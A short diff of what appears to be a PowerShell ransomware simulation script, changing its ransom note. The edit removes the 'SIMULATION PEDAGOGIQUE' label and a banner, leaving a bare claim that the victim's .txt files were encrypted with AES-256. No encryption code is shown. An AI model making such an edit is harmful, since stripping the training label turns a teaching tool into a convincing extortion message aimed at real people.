@@ -25,9 +25,8 @@ foreach ($file in $files)
 # --- NOTE DE RANSON ---
 $ransom = @"
 ==========================================================
-  ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
 ==========================================================
-  VOS FICHIERS ONT ETE CHIFFRES - SIMULATION PEDAGOGIQUE
+            VOS FICHIERS ONT ETE CHIFFRES
 ==========================================================
 
 Tous vos fichiers .txt ont ete chiffres avec AES-256.
